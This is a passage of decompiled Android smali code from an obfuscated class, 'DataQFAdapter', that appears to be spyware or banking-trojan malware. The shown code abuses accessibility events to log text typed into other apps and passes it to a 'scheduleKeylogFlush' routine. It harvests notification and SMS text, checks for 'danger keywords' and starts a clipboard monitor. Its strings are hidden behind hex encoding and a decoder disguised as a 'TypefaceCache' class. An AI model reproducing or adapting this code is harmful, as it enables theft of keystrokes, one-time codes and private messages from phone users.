    :goto_2
    invoke-interface {v11}, Ljava/lang/CharSequence;->length()I

    .line 73
    .line 74
    .line 75
    move-result v1

    .line 76
    if-nez v1, :cond_7

    .line 77
    .line 78
    move-object v1, v7

    .line 79
    goto :goto_3

    .line 80
    :cond_7
    move-object v1, v11

    .line 81
    :goto_3
    new-instance v3, Ljava/lang/StringBuilder;

    nop

    .line 82
    .line 83
    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    .line 84
    .line 85
    .line 86
    invoke-virtual {v3, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 87
    .line 88
    .line 89
    const-string v5, ":"

    .line 90
    .line 91
    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 92
    .line 93
    .line 94
    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    .line 95
    .line 96
    .line 97
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 98
    .line 99
    .line 100
    move-result-object v1

    .line 101
    iget-object v3, p0, Lapp/mobilex/plus/services/DataQFAdapter;->fieldTextCache:Ljava/util/HashMap;

    nop

    nop

    .line 102
    .line 103
    invoke-virtual {v3, v1}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 104
    .line 105
    .line 106
    move-result-object v3

    .line 107
    check-cast v3, Ljava/lang/String;

    .line 108
    .line 109
    if-nez v3, :cond_8

    .line 110
    .line 111
    goto :goto_4

    .line 112
    :cond_8
    move-object v2, v3

    .line 113
    :goto_4
    invoke-virtual {v4, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 114
    .line 115
    .line 116
    move-result v2
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_5

    .line 117
    if-eqz v2, :cond_9

    .line 118
    .line 119
    :try_start_7
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_2

    .line 120
    .line 121
    .line 122
    :catchall_2
    return-void

    .line 123
    :cond_9
    :try_start_8
    iget-object v2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->fieldTextCache:Ljava/util/HashMap;

    .line 124
    .line 125
    invoke-interface {v2, v1, v4}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 126
    .line 127
    .line 128
    iget-object v2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->fieldTimeCache:Ljava/util/HashMap;

    .line 129
    .line 130
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 131
    .line 132
    .line 133
    move-result-wide v5

    nop

    .line 134
    invoke-static {v5, v6}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    .line 135
    .line 136
    .line 137
    move-result-object v3

    nop

    nop

    .line 138
    invoke-interface {v2, v1, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 139
    .line 140
    .line 141
    iget-object v2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->currentApp:Ljava/lang/String;

    .line 142
    .line 143
    invoke-static {p2, v2}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 144
    .line 145
    .line 146
    move-result v2

    .line 147
    if-eqz v2, :cond_a

    .line 148
    .line 149
    iget-object v2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->currentAppName:Ljava/lang/String;

    .line 150
    .line 151
    goto/16 :goto_5

    .line 152
    :cond_a
    invoke-direct {p0, p2}, Lapp/mobilex/plus/services/DataQFAdapter;->resolveAppName(Ljava/lang/String;)Ljava/lang/String;

    .line 153
    .line 154
    .line 155
    move-result-object v2

    .line 156
    :goto_5
    const-string v3, "002800730042008B00FF00B8"

    .line 157
    .line 158
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 159
    .line 160
    .line 161
    move-result-object v3

    .line 162
    invoke-interface {v2}, Ljava/lang/CharSequence;->length()I

    .line 163
    .line 164
    .line 165
    move-result v5

    nop

    .line 166
    if-nez v5, :cond_b

    .line 167
    .line 168
    move-object v5, p2

    .line 169
    :goto_6
    move-object/from16 v10, v7

    .line 170
    goto :goto_7

    .line 171
    :cond_b
    move-object v5, v2

    .line 172
    goto :goto_6

    .line 173
    :goto_7
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 174
    .line 175
    .line 176
    move-result-wide v7

    .line 177
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 178
    .line 179
    .line 180
    move-result-object v9

    .line 181
    new-instance v2, Lv/s/NxAMaDFbSCxW6M03f;

    .line 182
    .line 183
    const/16 v12, 0x0

    .line 184
    move-object v6, p2

    .line 185
    invoke-direct/range {v2 .. v12}, Lv/s/NxAMaDFbSCxW6M03f;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;JLjava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V

    .line 186
    .line 187
    .line 188
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 189
    .line 190
    .line 191
    move-result-object v6

    .line 192
    const/16 v8, 0x0

    .line 193
    move-object v3, v1

    .line 194
    move-object v5, v4

    .line 195
    move-object v7, v10

    .line 196
    move-object/from16 v4, v2

    .line 197
    move-object v2, p0

    .line 198
    invoke-direct/range {v2 .. v8}, Lapp/mobilex/plus/services/DataQFAdapter;->scheduleKeylogFlush(Ljava/lang/String;Lv/s/NxAMaDFbSCxW6M03f;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_5

    .line 199
    .line 200
    .line 201
    :goto_8
    :try_start_9
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_9
    .catchall {:try_start_9 .. :try_end_9} :catchall_6

    .line 202
    .line 203
    .line 204
    goto :goto_a

    nop

    nop

    .line 205
    :cond_c
    :goto_9
    :try_start_a
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_a
    .catchall {:try_start_a .. :try_end_a} :catchall_3

    .line 206
    .line 207
    .line 208
    :catchall_3
    return-void

    .line 209
    :catchall_4
    const/4 p1, 0x0

    .line 210
    :catchall_5
    if-eqz p1, :cond_d

    .line 211
    .line 212
    goto :goto_8

    .line 213
    :catchall_6
    :cond_d
    :goto_a
    return-void
.end method

.method private final handleSmsAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;Ljava/lang/String;)V
    .locals 9

    .line 1
    :try_start_0
    new-instance v2, Lv/s/aqjfZUF02xH6w;

    .line 2
    .line 3
    invoke-direct {v2}, Ljava/lang/Object;-><init>()V

    .line 4
    .line 5
    .line 6
    new-instance v3, Lv/s/aqjfZUF02xH6w;

    .line 7
    .line 8
    invoke-direct {v3}, Ljava/lang/Object;-><init>()V

    .line 9
    .line 10
    .line 11
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityRecord;->getParcelableData()Landroid/os/Parcelable;

    .line 12
    .line 13
    .line 14
    move-result-object p2

    .line 15
    instance-of v0, p2, Landroid/app/Notification;

    .line 16
    .line 17
    const/4 v8, 0x0

    .line 18
    if-eqz v0, :cond_0

    .line 19
    .line 20
    check-cast p2, Landroid/app/Notification;

    .line 21
    .line 22
    goto/16 :goto_0

    .line 23
    :catch_0
    move-exception v0

    .line 24
    move-object p1, v0

    .line 25
    goto/16 :goto_a

    .line 26
    .line 27
    :cond_0
    move-object p2, v8

    .line 28
    :goto_0
    if-eqz p2, :cond_5

    .line 29
    .line 30
    iget-object p2, p2, Landroid/app/Notification;->extras:Landroid/os/Bundle;

    .line 31
    .line 32
    if-eqz p2, :cond_5

    .line 33
    .line 34
    const-string v0, "android.title"

    .line 35
    .line 36
    invoke-virtual {p2, v0}, Landroid/os/Bundle;->getCharSequence(Ljava/lang/String;)Ljava/lang/CharSequence;

    .line 37
    .line 38
    .line 39
    move-result-object v0

    .line 40
    if-eqz v0, :cond_1

    .line 41
    .line 42
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 43
    .line 44
    .line 45
    move-result-object v0

    .line 46
    goto/16 :goto_1

    .line 47
    :cond_1
    move-object/from16 v0, v8

    nop

    nop

    .line 48
    :goto_1
    iput-object v0, v2, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 49
    .line 50
    const-string v0, "android.bigText"

    .line 51
    .line 52
    invoke-virtual {p2, v0}, Landroid/os/Bundle;->getCharSequence(Ljava/lang/String;)Ljava/lang/CharSequence;

    .line 53
    .line 54
    .line 55
    move-result-object v0

    .line 56
    if-eqz v0, :cond_2

    .line 57
    .line 58
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 59
    .line 60
    .line 61
    move-result-object v0

    .line 62
    goto/16 :goto_2

    .line 63
    :cond_2
    move-object v0, v8

    .line 64
    :goto_2
    const-string v1, "android.text"

    .line 65
    .line 66
    invoke-virtual {p2, v1}, Landroid/os/Bundle;->getCharSequence(Ljava/lang/String;)Ljava/lang/CharSequence;

    .line 67
    .line 68
    .line 69
    move-result-object p2

    .line 70
    if-eqz p2, :cond_3

    .line 71
    .line 72
    invoke-virtual {p2}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 73
    .line 74
    .line 75
    move-result-object p2

    nop

    nop

    .line 76
    goto :goto_3

    .line 77
    :cond_3
    move-object p2, v8

    .line 78
    :goto_3
    if-nez v0, :cond_4

    .line 79
    .line 80
    move-object v0, p2

    .line 81
    :cond_4
    iput-object v0, v3, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 82
    .line 83
    :cond_5
    iget-object p2, v2, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 84
    .line 85
    check-cast p2, Ljava/lang/CharSequence;

    .line 86
    .line 87
    if-eqz p2, :cond_7

    .line 88
    .line 89
    invoke-static {p2}, Lv/s/BS2kx9eAoOyDiNGAFlFk;->euF5Udt5Rqv3Qmea(Ljava/lang/CharSequence;)Z

    .line 90
    .line 91
    .line 92
    move-result p2

    .line 93
    if-eqz p2, :cond_6

    .line 94
    .line 95
    goto/16 :goto_4

    .line 96
    :cond_6
    iget-object p2, v3, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    nop

    nop

    .line 97
    .line 98
    check-cast p2, Ljava/lang/CharSequence;

    .line 99
    .line 100
    if-eqz p2, :cond_7

    .line 101
    .line 102
    invoke-static {p2}, Lv/s/BS2kx9eAoOyDiNGAFlFk;->euF5Udt5Rqv3Qmea(Ljava/lang/CharSequence;)Z

    .line 103
    .line 104
    .line 105
    move-result p2

    .line 106
    if-eqz p2, :cond_11

    .line 107
    .line 108
    :cond_7
    :goto_4
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    .line 109
    .line 110
    .line 111
    move-result-object p2

    .line 112
    if-eqz p2, :cond_11

    .line 113
    .line 114
    invoke-interface {p2}, Ljava/util/Collection;->isEmpty()Z

    .line 115
    .line 116
    .line 117
    move-result p2

    nop

    nop

    .line 118
    if-eqz p2, :cond_8

    .line 119
    .line 120
    goto/16 :goto_8

    .line 121
    .line 122
    :cond_8
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    .line 123
    .line 124
    .line 125
    move-result-object p1

    .line 126
    new-instance p2, Ljava/util/ArrayList;

    .line 127
    .line 128
    invoke-direct {p2}, Ljava/util/ArrayList;-><init>()V

    .line 129
    .line 130
    .line 131
    invoke-interface {p1}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    .line 132
    .line 133
    .line 134
    move-result-object p1

    nop

    .line 135
    :cond_9
    :goto_5
    invoke-interface {p1}, Ljava/util/Iterator;->hasNext()Z

    .line 136
    .line 137
    .line 138
    move-result v0

    .line 139
    if-eqz v0, :cond_b

    .line 140
    .line 141
    invoke-interface {p1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 142
    .line 143
    .line 144
    move-result-object v0

    .line 145
    check-cast v0, Ljava/lang/CharSequence;

    nop

    .line 146
    .line 147
    if-eqz v0, :cond_a

    .line 148
    .line 149
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 150
    .line 151
    .line 152
    move-result-object v0

    .line 153
    goto :goto_6

    .line 154
    :cond_a
    move-object v0, v8

    .line 155
    :goto_6
    if-eqz v0, :cond_9

    .line 156
    .line 157
    invoke-virtual {p2, v0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 158
    .line 159
    .line 160
    goto :goto_5

    .line 161
    :cond_b
    new-instance p1, Ljava/util/ArrayList;

    .line 162
    .line 163
    invoke-direct {p1}, Ljava/util/ArrayList;-><init>()V

    .line 164
    .line 165
    .line 166
    invoke-virtual {p2}, Ljava/util/ArrayList;->size()I

    .line 167
    .line 168
    .line 169
    move-result v0

    .line 170
    const/4 v1, 0x0

    .line 171
    move v4, v1

    .line 172
    :cond_c
    :goto_7
    if-ge v4, v0, :cond_d

    .line 173
    .line 174
    invoke-virtual {p2, v4}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    .line 175
    .line 176
    .line 177
    move-result-object v5

    .line 178
    add-int/lit8 v4, v4, 0x1

    .line 179
    .line 180
    move-object v6, v5

    .line 181
    check-cast v6, Ljava/lang/String;

    .line 182
    .line 183
    invoke-static {v6}, Lv/s/BS2kx9eAoOyDiNGAFlFk;->euF5Udt5Rqv3Qmea(Ljava/lang/CharSequence;)Z

    .line 184
    .line 185
    .line 186
    move-result v6

    .line 187
    if-nez v6, :cond_c

    .line 188
    .line 189
    invoke-virtual {p1, v5}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 190
    .line 191
    .line 192
    goto :goto_7

    .line 193
    :cond_d
    invoke-virtual {p1}, Ljava/util/ArrayList;->size()I

    .line 194
    .line 195
    .line 196
    move-result p2

    .line 197
    const/4 v0, 0x2

    .line 198
    const/4 v4, 0x1

    .line 199
    if-lt p2, v0, :cond_f

    nop

    .line 200
    .line 201
    iget-object p2, v2, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 202
    .line 203
    check-cast p2, Ljava/lang/CharSequence;

    .line 204
    .line 205
    if-eqz p2, :cond_e

    .line 206
    .line 207
    invoke-static {p2}, Lv/s/BS2kx9eAoOyDiNGAFlFk;->euF5Udt5Rqv3Qmea(Ljava/lang/CharSequence;)Z

    .line 208
    .line 209
    .line 210
    move-result p2

    .line 211
    if-eqz p2, :cond_f

    .line 212
    .line 213
    :cond_e
    invoke-virtual {p1, v1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    .line 214
    .line 215
    .line 216
    move-result-object p2

    .line 217
    iput-object p2, v2, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 218
    .line 219
    invoke-static {p1, v4}, Lv/s/imhBI9RqzETHtVIJe;->iUQk66nAiXgO35(Ljava/lang/Iterable;I)Ljava/util/List;

    .line 220
    .line 221
    .line 222
    move-result-object p1

    .line 223
    const-string p2, " "

    .line 224
    .line 225
    const/16 v0, 0x3e

    .line 226
    .line 227
    invoke-static {p1, p2, v8, v0}, Lv/s/imhBI9RqzETHtVIJe;->euF5Udt5Rqv3Qmea(Ljava/util/Collection;Ljava/lang/String;Lv/s/deLJ4Z0aL3hcJ3O1;I)Ljava/lang/String;

    .line 228
    .line 229
    .line 230
    move-result-object p1

    .line 231
    iput-object p1, v3, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    nop

    nop

    .line 232
    .line 233
    goto/16 :goto_8

    .line 234
    :cond_f
    invoke-virtual {p1}, Ljava/util/ArrayList;->size()I

    .line 235
    .line 236
    .line 237
    move-result p2

    .line 238
    if-ne p2, v4, :cond_11

    .line 239
    .line 240
    iget-object p2, v3, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 241
    .line 242
    check-cast p2, Ljava/lang/CharSequence;

    .line 243
    .line 244
    if-eqz p2, :cond_10

    .line 245
    .line 246
    invoke-static {p2}, Lv/s/BS2kx9eAoOyDiNGAFlFk;->euF5Udt5Rqv3Qmea(Ljava/lang/CharSequence;)Z

    .line 247
    .line 248
    .line 249
    move-result p2

    .line 250
    if-eqz p2, :cond_11

    .line 251
    .line 252
    :cond_10
    invoke-virtual {p1, v1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    .line 253
    .line 254
    .line 255
    move-result-object p1

    .line 256
    iput-object p1, v3, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 257
    .line 258
    :cond_11
    :goto_8
    iget-object p1, v2, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 259
    .line 260
    check-cast p1, Ljava/lang/CharSequence;

    nop

    .line 261
    .line 262
    if-eqz p1, :cond_14

    .line 263
    .line 264
    invoke-static {p1}, Lv/s/BS2kx9eAoOyDiNGAFlFk;->euF5Udt5Rqv3Qmea(Ljava/lang/CharSequence;)Z

    .line 265
    .line 266
    .line 267
    move-result p1

    .line 268
    if-eqz p1, :cond_12

    nop

    nop

    .line 269
    .line 270
    goto :goto_9

    nop

    .line 271
    :cond_12
    iget-object p1, v3, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 272
    .line 273
    check-cast p1, Ljava/lang/CharSequence;

    .line 274
    .line 275
    if-eqz p1, :cond_14

    .line 276
    .line 277
    invoke-static {p1}, Lv/s/BS2kx9eAoOyDiNGAFlFk;->euF5Udt5Rqv3Qmea(Ljava/lang/CharSequence;)Z

    .line 278
    .line 279
    .line 280
    move-result p1

    .line 281
    if-eqz p1, :cond_13

    nop

    nop

    .line 282
    .line 283
    goto/16 :goto_9

    .line 284
    :cond_13
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 285
    .line 286
    .line 287
    move-result-wide v4

    .line 288
    const-string p1, "00020027000A00BE00B0008C00FF0094007900360048008200FE00BB00D700B5007E"

    .line 289
    .line 290
    invoke-static {p1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 291
    .line 292
    .line 293
    iget-object p1, v2, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 294
    .line 295
    const-string p2, "006F00360059008800F400A6008F"

    .line 296
    .line 297
    invoke-static {p2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 298
    .line 299
    .line 300
    iget-object p2, v3, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 301
    .line 302
    check-cast p2, Ljava/lang/String;

    .line 303
    .line 304
    const/16 v0, 0x28

    .line 305
    .line 306
    invoke-static {p2, v0}, Lv/s/KgSM0TsKUpCiuePB;->KV57Z6oavcB595B8Dy8Z(Ljava/lang/String;I)Ljava/lang/String;

    .line 307
    .line 308
    .line 309
    const-string p2, "006F0036004B008C00F700E2"

    .line 310
    .line 311
    invoke-static {p2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 312
    .line 313
    .line 314
    invoke-static {p1}, Ljava/util/Objects;->toString(Ljava/lang/Object;)Ljava/lang/String;

    .line 315
    .line 316
    .line 317
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    .line 318
    .line 319
    .line 320
    move-result-object v1

    nop

    nop

    .line 321
    sget-object p1, Lv/s/umMdYoePNXvWWPn;->w9sT1Swbhx3hs:Lv/s/oT0hSL7wye6TP1X12yCL;

    .line 322
    .line 323
    invoke-static {p1}, Lv/s/jb8et6SZeK5TWMrJFxDX;->dDIMxZXP1V8HdM(Lv/s/cpTq2XMCb5JSaEhn;)Lv/s/f58wUe2vbJhag6PETTG;

    .line 324
    .line 325
    .line 326
    move-result-object p1

    .line 327
    new-instance v0, Lv/s/jsE9ajv4xUVxJHDN1v8;

    nop

    .line 328
    .line 329
    const/16 v6, 0x0

    .line 330
    const/4 v7, 0x1

    .line 331
    invoke-direct/range {v0 .. v7}, Lv/s/jsE9ajv4xUVxJHDN1v8;-><init>(Landroid/content/Context;Ljava/io/Serializable;Ljava/io/Serializable;JLv/s/b9xRoaXFR1fmOO2Q;I)V

    .line 332
    .line 333
    .line 334
    const/4 p2, 0x3

    .line 335
    invoke-static {p1, v8, v0, p2}, Lv/s/y6jRGLEWNMir;->b1EoSIRjJHO5(Lv/s/wh3Lv6S5rs6zqjV;Lv/s/oT0hSL7wye6TP1X12yCL;Lv/s/NhN5GSKLYh6STld4;I)Lv/s/snDbSR9Gb3eZZuB;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 336
    .line 337
    .line 338
    :cond_14
    :goto_9
    return-void

    .line 339
    :goto_a
    const-string p2, "002B00770055008300FC00BA00E100AA003000570058008400F500AC00C100AE0021007F0057008E00E400A600F700B100260078004F00C700F500AD00C000A80031002C001B"

    .line 340
    .line 341
    invoke-static {p2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 342
    .line 343
    .line 344
    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 345
    .line 346
    .line 347
    return-void
.end method

.method private final hasDangerKeywords(Ljava/lang/String;)Z
    .locals 2

    .line 1
    :try_start_0
    sget-boolean v0, Lapp/mobilex/plus/util/UtilYWProcessor;->dDIMxZXP1V8HdM:Z

    nop

    .line 2
    .line 3
    if-eqz v0, :cond_0

    .line 4
    .line 5
    invoke-static {p1}, Lapp/mobilex/plus/util/UtilYWProcessor;->rfv(Ljava/lang/String;)Z

    .line 6
    .line 7
    .line 8
    move-result p1
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 9
    return p1

    .line 10
    :catchall_0
    :cond_0
    const-string v0, "04000422040B04DC04A8049D04FE"

    .line 11
    .line 12
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 13
    .line 14
    .line 15
    move-result-object v0

    .line 16
    const/4 v1, 0x0

    .line 17
    invoke-static {p1, v0, v1}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 18
    .line 19
    .line 20
    move-result v0

    nop

    .line 21
    if-nez v0, :cond_1

    .line 22
    .line 23
    const-string v0, "003600780052008900E300AB00D300AB002F"

    .line 24
    .line 25
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 26
    .line 27
    .line 28
    move-result-object v0

    .line 29
    invoke-static {p1, v0, v1}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 30
    .line 31
    .line 32
    move-result v0

    .line 33
    if-nez v0, :cond_1

    .line 34
    .line 35
    const-string v0, "04770423040304DA04D1049D048204FC0478"

    .line 36
    .line 37
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 38
    .line 39
    .line 40
    move-result-object v0

    .line 41
    invoke-static {p1, v0, v1}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 42
    .line 43
    .line 44
    move-result v0

    .line 45
    if-nez v0, :cond_1

    .line 46
    .line 47
    const-string v0, "002500790049008400F500FF00C100B3002C0066"

    .line 48
    .line 49
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 50
    .line 51
    .line 52
    move-result-object v0

    .line 53
    invoke-static {p1, v0, v1}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 54
    .line 55
    .line 56
    move-result v0

    .line 57
    if-nez v0, :cond_1

    .line 58
    .line 59
    const-string v0, "047D0457047904D704AD04E1048004FF0401045A"

    .line 60
    .line 61
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 62
    .line 63
    .line 64
    move-result-object v0

    .line 65
    invoke-static {p1, v0, v1}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 66
    .line 67
    .line 68
    move-result v0

    .line 69
    if-nez v0, :cond_1

    .line 70
    .line 71
    const-string v0, "047D0454040104DC04DE0498048A0485040F"

    .line 72
    .line 73
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 74
    .line 75
    .line 76
    move-result-object v0

    .line 77
    invoke-static {p1, v0, v1}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 78
    .line 79
    .line 80
    move-result v0

    .line 81
    if-nez v0, :cond_1

    .line 82
    .line 83
    const-string v0, "0027007F0048008600F200B300D7"

    .line 84
    .line 85
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 86
    .line 87
    .line 88
    move-result-object v0

    .line 89
    invoke-static {p1, v0, v1}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 90
    .line 91
    .line 92
    move-result v0

    .line 93
    if-nez v0, :cond_1

    .line 94
    .line 95
    const-string v0, "002500770058009300FF00AD00CB00E7003100730048008200E4"

    .line 96
    .line 97
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 98
    .line 99
    .line 100
    move-result-object v0

    .line 101
    invoke-static {p1, v0, v1}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 102
    .line 103
    .line 104
    move-result v0

    .line 105
    if-nez v0, :cond_1

    .line 106
    .line 107
    const-string v0, "04020427047B04D904D104E704F0048B"

    .line 108
    .line 109
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 110
    .line 111
    .line 112
    move-result-object v0

    nop

    .line 113
    invoke-static {p1, v0, v1}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 114
    .line 115
    .line 116
    move-result v0

    .line 117
    if-nez v0, :cond_1

    .line 118
    .line 119
    const-string v0, "04020427047B04D904D100FF048604F7047E042B047004A2"

    .line 120
    .line 121
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 122
    .line 123
    .line 124
    move-result-object v0

    .line 125
    invoke-static {p1, v0, v1}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 126
    .line 127
    .line 128
    move-result p1

    .line 129
    if-eqz p1, :cond_2

    nop

    .line 130
    .line 131
    :cond_1
    const/16 v1, 0x1

    .line 132
    :cond_2
    return v1
.end method

.method public static synthetic hjneShqpF9Tis4(Ljava/lang/Runnable;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->safePost$lambda$0(Ljava/lang/Runnable;)V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method public static synthetic ibVTtJUNfrGYbW(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->startGuardPollThread$lambda$17$lambda$15(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method private final initClipboardMonitor()V
    .locals 2

    .line 1
    :try_start_0
    const-string v0, "clipboard"

    .line 2
    .line 3
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 4
    .line 5
    .line 6
    move-result-object v0

    .line 7
    check-cast v0, Landroid/content/ClipboardManager;

    nop

    .line 8
    .line 9
    iput-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->clipboardManager:Landroid/content/ClipboardManager;

    .line 10
    .line 11
    new-instance v1, Lv/s/WlzXLqWUINyncH04DOBE;

    .line 12
    .line 13
